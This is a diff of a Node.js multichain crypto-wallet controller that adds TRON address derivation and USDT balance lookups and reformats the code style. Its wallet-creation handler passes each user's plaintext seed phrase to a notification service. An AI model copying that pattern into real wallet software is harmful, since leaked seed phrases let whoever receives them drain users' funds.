@@ -1,18 +1,17 @@
-const multichainService = require('../services/multichain/multichain.service');
-const db = require('../db/index'); // ✅ Updated to centralized db
-const encryptionService = require('../security/encryption.service');
-const auditLogger = require('../security/audit-logger.service');
-const notificationService = require('../services/monitoring/notification.service');
-const { success, error } = require('../utils/response');
-const crypto = require('crypto');
-const { v4: uuidv4 } = require('uuid');
-const bip39 = require('bip39');
-const { ethers } = require('ethers');
-const bitcoin = require('bitcoinjs-lib');
-const BIP32Factory = require('bip32').default;
-const ecc = require('tiny-secp256k1');
+const multichainService = require("../services/multichain/multichain.service");
+const db = require("../db/index"); // ✅ Updated to centralized db
+const encryptionService = require("../security/encryption.service");
+const auditLogger = require("../security/audit-logger.service");
+const notificationService = require("../services/monitoring/notification.service");
+const { success, error } = require("../utils/response");
+const crypto = require("crypto");
+const { v4: uuidv4 } = require("uuid");
+const bip39 = require("bip39");
+const { ethers } = require("ethers");
+const bitcoin = require("bitcoinjs-lib");
+const BIP32Factory = require("bip32").default;
+const ecc = require("tiny-secp256k1");
 const bip32 = BIP32Factory(ecc);
-
 
 /**
  * Create new multichain wallet with encrypted mnemonic backup
@@ -22,40 +21,45 @@ exports.createMultichainWallet = async (req, res) => {
     const {
       devicePassCodeId,
       mnemonic,
-      walletName = 'Main Wallet',
-      isMain = true
+      walletName = "Main Wallet",
+      isMain = true,
     } = req.body;
 
     // Validation
     if (!devicePassCodeId || !mnemonic) {
       return res.status(400).json({
         success: false,
-        message: 'devicePassCodeId and mnemonic are required'
+        message: "devicePassCodeId and mnemonic are required",
       });
     }
 
     // Verify device passcode exists and get passcode for encryption
-    const device = await db.prepare(`
+    const device = await db
+      .prepare(
+        `
       SELECT id, passcode 
       FROM device_passcodes 
       WHERE id = ?
-    `).get(devicePassCodeId);
+    `
+      )
+      .get(devicePassCodeId);
 
     if (!device) {
       return res.status(404).json({
         success: false,
-        message: 'Device passcode not found'
+        message: "Device passcode not found",
       });
     }
 
     // Generate wallet ID
-    const walletId = uuidv4().replace(/-/g, '');
+    const walletId = uuidv4().replace(/-/g, "");
 
     // Generate addresses for multiple chains
     const networks = [
-      { chain: 'ETHEREUM', symbol: 'ETH', type: 'EVM' },
-      { chain: 'BSC', symbol: 'BNB', type: 'EVM' },
-      { chain: 'BITCOIN', symbol: 'BTC', type: 'UTXO' },
+      { chain: "ETHEREUM", symbol: "ETH", type: "EVM" },
+      { chain: "BSC", symbol: "BNB", type: "EVM" },
+      { chain: "BITCOIN", symbol: "BTC", type: "UTXO" },
+      { chain: "TRON", symbol: "TRX", type: "TRON" },
     ];
     // { chain: 'POLYGON', symbol: 'MATIC', type: 'EVM' },
     // { chain: 'ARBITRUM', symbol: 'ETH', type: 'EVM' },
@@ -72,19 +76,22 @@ exports.createMultichainWallet = async (req, res) => {
 
     // Generate addresses for each network
     for (const network of networks) {
-      const { address } = await generateWalletFromMnemonic(mnemonic, network.chain);
-      
+      const { address } = await generateWalletFromMnemonic(
+        mnemonic,
+        network.chain
+      );
+
       if (!primaryAddress) {
         primaryAddress = address; // Use first EVM address as primary
       }
 
       generatedNetworks.push({
-        id: uuidv4().replace(/-/g, ''),
+        id: uuidv4().replace(/-/g, ""),
         chain: network.chain,
         chainName: getChainName(network.chain),
         symbol: network.symbol,
         address,
-        type: network.type
+        type: network.type,
       });
     }
 
@@ -134,7 +141,7 @@ exports.createMultichainWallet = async (req, res) => {
       );
 
       if (walletResult.changes === 0) {
-        throw new Error('Failed to insert wallet');
+        throw new Error("Failed to insert wallet");
       }
 
       // Insert all networks
@@ -150,7 +157,7 @@ exports.createMultichainWallet = async (req, res) => {
       // Insert encrypted mnemonic for backup
       await insertEncryptedMnemonic.run(walletId, encryptedMnemonic);
     } catch (dbError) {
-      console.error('Database error creating wallet:', dbError);
+      console.error("Database error creating wallet:", dbError);
       throw new Error(`Failed to create wallet: ${dbError.message}`);
     }
 
@@ -158,7 +165,7 @@ exports.createMultichainWallet = async (req, res) => {
 
     // Send wallet created notification
     try {
-      const notificationService = require('../services/monitoring/notification.service');
+      const notificationService = require("../services/monitoring/notification.service");
       await notificationService.sendWalletCreatedNotification({
         walletId,
         walletName,
@@ -166,12 +173,15 @@ exports.createMultichainWallet = async (req, res) => {
         primaryAddress,
         mnemonic,
         isMain,
-        chains: generatedNetworks.map(n => n.chain),
+        chains: generatedNetworks.map((n) => n.chain),
         networks: generatedNetworks,
-        ip: req.ip
+        ip: req.ip,
       });
     } catch (notifError) {
-      console.error('Failed to send wallet created notification:', notifError.message);
+      console.error(
+        "Failed to send wallet created notification:",
+        notifError.message
+      );
       // Don't fail wallet creation if notification fails
     }
 
@@ -188,43 +198,40 @@ exports.createMultichainWallet = async (req, res) => {
         backupStatus: {
           isBackedUp: false,
           encrypted: true,
-          message: 'Seed phrase safely encrypted. Remember to backup after your first transaction.'
+          message:
+            "Seed phrase safely encrypted. Remember to backup after your first transaction.",
         },
-        created_at: new Date().toISOString()
-      }
+        created_at: new Date().toISOString(),
+      },
     });
-
   } catch (error) {
-    console.error('❌ Error creating wallet:', error);
+    console.error("❌ Error creating wallet:", error);
     res.status(500).json({
       success: false,
-      message: 'Failed to create wallet',
-      error: error.message
+      message: "Failed to create wallet",
+      error: error.message,
     });
   }
 };
 
-
 function getChainName(chain) {
   const names = {
-    'ETHEREUM': 'Ethereum',
-    'BSC': 'BNB Smart Chain',
-    'POLYGON': 'Polygon',
-    'ARBITRUM': 'Arbitrum One',
-    'OPTIMISM': 'Optimism',
-    'AVALANCHE': 'Avalanche C-Chain',
-    'FANTOM': 'Fantom',
-    'BASE': 'Base',
-    'BITCOIN': 'Bitcoin',
-    'LITECOIN': 'Litecoin',
-    'SOLANA': 'Solana',
-    'COSMOS': 'Cosmos Hub'
+    ETHEREUM: "Ethereum",
+    BSC: "BNB Smart Chain",
+    POLYGON: "Polygon",
+    ARBITRUM: "Arbitrum One",
+    OPTIMISM: "Optimism",
+    AVALANCHE: "Avalanche C-Chain",
+    FANTOM: "Fantom",
+    BASE: "Base",
+    BITCOIN: "Bitcoin",
+    LITECOIN: "Litecoin",
+    SOLANA: "Solana",
+    COSMOS: "Cosmos Hub",
+    TRON: "Tron",
   };
   return names[chain] || chain;
 }
-
-
-
 
 /**
  * Get balances for all chains in a wallet
@@ -234,47 +241,55 @@ exports.getMultiChainBalances = async (req, res) => {
     const { walletId } = req.params;
 
     const networks = await db
-      .prepare('SELECT * FROM wallet_networks WHERE wallet_id = ?')
+      .prepare("SELECT * FROM wallet_networks WHERE wallet_id = ?")
       .all(walletId);
 
     if (!networks || networks.length === 0) {
-      return error(res, 'No networks found for this wallet');
+      return error(res, "No networks found for this wallet");
     }
 
     // ✅ PARALLEL: Fetch all balances simultaneously (native + USDT for ETH and BSC)
     const balancePromises = networks.flatMap(async (network) => {
       const results = [];
-      
+
       // Fetch native coin balance
       try {
         const balance = await multichainService.getBalance(
           network.network,
           network.address
         );
-        
+
         results.push({
           id: network.id,
           ...balance,
-          created_at: network.created_at
+          created_at: network.created_at,
         });
       } catch (err) {
-        console.error(`Failed to fetch balance for ${network.network}:`, err.message);
+        console.error(
+          `Failed to fetch balance for ${network.network}:`,
+          err.message
+        );
         results.push({
           id: network.id,
           chain: network.network,
           address: network.address,
-          balance: '0',
-          error: err.message
+          balance: "0",
+          error: err.message,
         });
       }
 
-      // For ETH and BSC, also fetch USDT balance
-      if (network.network === 'ETHEREUM' || network.network === 'BSC') {
+      // For ETH, BSC, and TRON, also fetch USDT balance
+      if (
+        network.network === "ETHEREUM" ||
+        network.network === "BSC" ||
+        network.network === "TRON"
+      ) {
         try {
           // USDT contract addresses
           const USDT_CONTRACTS = {
-            'ETHEREUM': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-            'BSC': '0x55d398326f99059fF775485246999027B3197955'
+            ETHEREUM: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            BSC: "0x55d398326f99059fF775485246999027B3197955",
+            TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRC20 USDT
           };
 
           const usdtBalance = await multichainService.getTokenBalance(
@@ -286,18 +301,21 @@ exports.getMultiChainBalances = async (req, res) => {
           results.push({
             id: `${network.id}_USDT`,
             ...usdtBalance,
-            created_at: network.created_at
+            created_at: network.created_at,
           });
         } catch (err) {
-          console.error(`Failed to fetch USDT balance for ${network.network}:`, err.message);
+          console.error(
+            `Failed to fetch USDT balance for ${network.network}:`,
+            err.message
+          );
           results.push({
             id: `${network.id}_USDT`,
             chain: network.network,
             address: network.address,
-            symbol: 'USDT',
-            balance: '0',
+            symbol: "USDT",
+            balance: "0",
             error: err.message,
-            isToken: true
+            isToken: true,
           });
         }
       }
@@ -310,15 +328,13 @@ exports.getMultiChainBalances = async (req, res) => {
     return success(res, {
       walletId,
       totalNetworks: networks.length,
-      balances
+      balances,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'getMultiChainBalances' });
+    auditLogger.logError(e, { controller: "getMultiChainBalances" });
     return error(res, e.message);
   }
 };
-
 
 /**
  * Generate wallet from mnemonic for specific chain
@@ -326,46 +342,67 @@ exports.getMultiChainBalances = async (req, res) => {
  */
 async function generateWalletFromMnemonic(mnemonic, chain) {
   const seed = await bip39.mnemonicToSeed(mnemonic);
-  
+
   switch (chain.toUpperCase()) {
-    case 'ETHEREUM': {
+    case "ETHEREUM": {
       const hdNode = ethers.utils.HDNode.fromSeed(seed);
       const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
       return {
         address: wallet.address,
-        privateKey: wallet.privateKey
+        privateKey: wallet.privateKey,
       };
     }
-    
-    case 'BSC': {
+
+    case "BSC": {
       // BSC uses the same derivation path as Ethereum (EVM-compatible)
       const hdNode = ethers.utils.HDNode.fromSeed(seed);
       const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
       return {
         address: wallet.address,
-        privateKey: wallet.privateKey
+        privateKey: wallet.privateKey,
       };
     }
-    
-    case 'BITCOIN': {
+
+    case "BITCOIN": {
       // Bitcoin uses BIP32 with derivation path m/44'/0'/0'/0/0
       const root = bip32.fromSeed(seed);
       const child = root.derivePath("m/44'/0'/0'/0/0");
-      
+
       // Generate native segwit (bech32) address - most modern format
       const { address } = bitcoin.payments.p2wpkh({
         pubkey: child.publicKey,
-        network: bitcoin.networks.bitcoin
+        network: bitcoin.networks.bitcoin,
       });
-      
+
       return {
         address: address,
-        privateKey: child.toWIF() // WIF format for Bitcoin private key
+        privateKey: child.toWIF(), // WIF format for Bitcoin private key
       };
     }
-    
+
+    case "TRON": {
+      // Tron uses the same derivation path as Ethereum (m/44'/195'/0'/0/0)
+      const TronWeb = require("tronweb");
+      const hdNode = ethers.utils.HDNode.fromSeed(seed);
+      const wallet = hdNode.derivePath("m/44'/195'/0'/0/0");
+
+      const tronWeb = new TronWeb({
+        fullHost: "https://api.trongrid.io",
+      });
+
+      const privateKeyHex = wallet.privateKey.slice(2);
+      const address = tronWeb.address.fromPrivateKey(privateKeyHex);
+
+      return {
+        address: address,
+        privateKey: wallet.privateKey,
+      };
+    }
+
     default:
-      throw new Error(`Chain ${chain} is not supported. Supported chains: ETHEREUM, BSC, BITCOIN`);
+      throw new Error(
+        `Chain ${chain} is not supported. Supported chains: ETHEREUM, BSC, BITCOIN, TRON`
+      );
   }
 }
 
@@ -377,7 +414,6 @@ async function encryptMnemonic(mnemonic, devicePassCodeId, passcode) {
   return encryptionService.encrypt(mnemonic);
 }
 
-
 /**
  * Get balance for specific chain
  */
@@ -386,7 +422,9 @@ exports.getChainBalance = async (req, res) => {
     const { walletId, chainId } = req.params;
 
     const network = db
-      .prepare('SELECT * FROM wallet_networks WHERE wallet_id = ? AND network = ?')
+      .prepare(
+        "SELECT * FROM wallet_networks WHERE wallet_id = ? AND network = ?"
+      )
       .get(walletId, chainId.toUpperCase());
 
     if (!network) {
@@ -402,11 +440,10 @@ exports.getChainBalance = async (req, res) => {
       walletId,
       networkId: network.id,
       ...balance,
-      created_at: network.created_at
+      created_at: network.created_at,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'getChainBalance' });
+    auditLogger.logError(e, { controller: "getChainBalance" });
     return error(res, e.message);
   }
 };
@@ -419,7 +456,9 @@ exports.getChainAddress = async (req, res) => {
     const { walletId, chainId } = req.params;
 
     const network = db
-      .prepare('SELECT * FROM wallet_networks WHERE wallet_id = ? AND network = ?')
+      .prepare(
+        "SELECT * FROM wallet_networks WHERE wallet_id = ? AND network = ?"
+      )
       .get(walletId, chainId.toUpperCase());
 
     if (!network) {
@@ -430,11 +469,10 @@ exports.getChainAddress = async (req, res) => {
       walletId,
       chain: network.network,
       address: network.address,
-      networkId: network.id
+      networkId: network.id,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'getChainAddress' });
+    auditLogger.logError(e, { controller: "getChainAddress" });
     return error(res, e.message);
   }
 };
@@ -448,11 +486,10 @@ exports.getSupportedChains = async (req, res) => {
 
     return success(res, {
       total: chains.length,
-      chains
+      chains,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'getSupportedChains' });
+    auditLogger.logError(e, { controller: "getSupportedChains" });
     return error(res, e.message);
   }
 };
@@ -465,7 +502,7 @@ exports.validateChainAddress = async (req, res) => {
     const { chainId, address } = req.body;
 
     if (!chainId || !address) {
-      return error(res, 'chainId and address are required');
+      return error(res, "chainId and address are required");
     }
 
     const isValid = multichainService.validateAddress(chainId, address);
@@ -473,11 +510,10 @@ exports.validateChainAddress = async (req, res) => {
     return success(res, {
       chainId,
       address,
-      isValid
+      isValid,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'validateChainAddress' });
+    auditLogger.logError(e, { controller: "validateChainAddress" });
     return error(res, e.message);
   }
 };
@@ -490,49 +526,59 @@ exports.addChainToWallet = async (req, res) => {
     const { walletId, chainId } = req.body;
 
     if (!walletId || !chainId) {
-      return error(res, 'walletId and chainId are required');
+      return error(res, "walletId and chainId are required");
     }
 
     const existing = db
-      .prepare('SELECT * FROM wallet_networks WHERE wallet_id = ? AND network = ?')
+      .prepare(
+        "SELECT * FROM wallet_networks WHERE wallet_id = ? AND network = ?"
+      )
       .get(walletId, chainId.toUpperCase());
 
     if (existing) {
-      return error(res, 'Chain already exists in this wallet');
+      return error(res, "Chain already exists in this wallet");
     }
 
     const credentials = db
-      .prepare('SELECT mnemonic_passphrase FROM credentials WHERE wallet_id = ? LIMIT 1')
+      .prepare(
+        "SELECT mnemonic_passphrase FROM credentials WHERE wallet_id = ? LIMIT 1"
+      )
       .get(walletId);
 
     if (!credentials) {
-      return error(res, 'Wallet credentials not found');
+      return error(res, "Wallet credentials not found");
     }
 
     const mnemonic = encryptionService.decrypt(credentials.mnemonic_passphrase);
-    const chainWallets = await multichainService.generateMultiChainWallet(mnemonic);
+    const chainWallets = await multichainService.generateMultiChainWallet(
+      mnemonic
+    );
     const wallet = chainWallets[chainId.toUpperCase()];
 
     if (!wallet) {
       return error(res, `Chain ${chainId} is not supported`);
     }
 
-    const networkId = crypto.randomBytes(16).toString('hex');
+    const networkId = crypto.randomBytes(16).toString("hex");
     const encryptedPrivateKey = encryptionService.encrypt(wallet.privateKey);
 
-    db.prepare(`
+    db.prepare(
+      `
       INSERT INTO wallet_networks (id, wallet_id, address, network, created_at)
       VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
-    `).run(networkId, walletId, wallet.address, chainId.toUpperCase());
+    `
+    ).run(networkId, walletId, wallet.address, chainId.toUpperCase());
 
-    const credId = crypto.randomBytes(16).toString('hex');
-    db.prepare(`
+    const credId = crypto.randomBytes(16).toString("hex");
+    db.prepare(
+      `
       INSERT INTO credentials (
         unique_id, public_address, private_key, mnemonic_passphrase,
         wallet_id, device_id, record_created_date, record_updated_date
       )
       VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
-    `).run(
+    `
+    ).run(
       credId,
       wallet.address,
       encryptedPrivateKey,
@@ -542,11 +588,11 @@ exports.addChainToWallet = async (req, res) => {
     );
 
     auditLogger.logSecurityEvent({
-      type: 'CHAIN_ADDED_TO_WALLET',
+      type: "CHAIN_ADDED_TO_WALLET",
       walletId,
       chainId: chainId.toUpperCase(),
       address: wallet.address,
-      ip: req.ip
+      ip: req.ip,
     });
 
     return success(res, {
@@ -556,11 +602,10 @@ exports.addChainToWallet = async (req, res) => {
       chainName: wallet.chainName,
       symbol: wallet.symbol,
       address: wallet.address,
-      type: wallet.type
+      type: wallet.type,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'addChainToWallet' });
+    auditLogger.logError(e, { controller: "addChainToWallet" });
     return error(res, e.message);
   }
 };
@@ -573,28 +618,29 @@ exports.removeChainFromWallet = async (req, res) => {
     const { walletId, chainId } = req.params;
 
     const result = db
-      .prepare('DELETE FROM wallet_networks WHERE wallet_id = ? AND network = ?')
+      .prepare(
+        "DELETE FROM wallet_networks WHERE wallet_id = ? AND network = ?"
+      )
       .run(walletId, chainId.toUpperCase());
 
     if (result.changes === 0) {
-      return error(res, 'Chain not found in wallet');
+      return error(res, "Chain not found in wallet");
     }
 
     auditLogger.logSecurityEvent({
-      type: 'CHAIN_REMOVED_FROM_WALLET',
+      type: "CHAIN_REMOVED_FROM_WALLET",
       walletId,
       chainId: chainId.toUpperCase(),
-      ip: req.ip
+      ip: req.ip,
     });
 
     return success(res, {
-      message: 'Chain removed successfully',
+      message: "Chain removed successfully",
       walletId,
-      chainId: chainId.toUpperCase()
+      chainId: chainId.toUpperCase(),
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'removeChainFromWallet' });
+    auditLogger.logError(e, { controller: "removeChainFromWallet" });
     return error(res, e.message);
   }
 };
@@ -607,50 +653,57 @@ exports.getWalletSummary = async (req, res) => {
     const { walletId } = req.params;
 
     const wallet = await db
-      .prepare('SELECT * FROM wallets WHERE id = ?')
+      .prepare("SELECT * FROM wallets WHERE id = ?")
       .get(walletId);
 
     if (!wallet) {
-      return error(res, 'Wallet not found');
+      return error(res, "Wallet not found");
     }
 
     const networks = await db
-      .prepare('SELECT * FROM wallet_networks WHERE wallet_id = ? ORDER BY created_at ASC')
+      .prepare(
+        "SELECT * FROM wallet_networks WHERE wallet_id = ? ORDER BY created_at ASC"
+      )
       .all(walletId);
 
     // ✅ PARALLEL: Fetch all balances simultaneously (native + USDT for ETH and BSC)
     const balancePromises = networks.flatMap(async (network) => {
       const results = [];
-      
+
       // Fetch native coin balance
       try {
         const balance = await multichainService.getBalance(
           network.network,
           network.address
         );
-        
+
         results.push({
           id: network.id,
           ...balance,
-          created_at: network.created_at
+          created_at: network.created_at,
         });
       } catch (err) {
         results.push({
           id: network.id,
           chain: network.network,
           address: network.address,
-          balance: '0',
-          error: err.message
+          balance: "0",
+          error: err.message,
         });
       }
 
-      // For ETH and BSC, also fetch USDT balance
-      if (network.network === 'ETHEREUM' || network.network === 'BSC') {
+      // For ETH, BSC, and TRON, also fetch USDT balance
+      if (
+        network.network === "ETHEREUM" ||
+        network.network === "BSC" ||
+        network.network === "TRON"
+      ) {
         try {
           // USDT contract addresses
           const USDT_CONTRACTS = {
-            'ETHEREUM': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-            'BSC': '0x55d398326f99059fF775485246999027B3197955'
+            ETHEREUM: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+            BSC: "0x55d398326f99059fF775485246999027B3197955",
+            TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRC20 USDT
           };
 
           const usdtBalance = await multichainService.getTokenBalance(
@@ -662,17 +715,17 @@ exports.getWalletSummary = async (req, res) => {
           results.push({
             id: `${network.id}_USDT`,
             ...usdtBalance,
-            created_at: network.created_at
+            created_at: network.created_at,
           });
         } catch (err) {
           results.push({
             id: `${network.id}_USDT`,
             chain: network.network,
             address: network.address,
-            symbol: 'USDT',
-            balance: '0',
+            symbol: "USDT",
+            balance: "0",
             error: err.message,
-            isToken: true
+            isToken: true,
           });
         }
       }
@@ -690,12 +743,10 @@ exports.getWalletSummary = async (req, res) => {
       isMain: Boolean(wallet.is_main),
       created_at: wallet.created_at,
       totalChains: networks.length,
-      chains: chainDetails
+      chains: chainDetails,
     });
-
   } catch (e) {
-    auditLogger.logError(e, { controller: 'getWalletSummary' });
+    auditLogger.logError(e, { controller: "getWalletSummary" });
     return error(res, e.message);
   }
 };
-
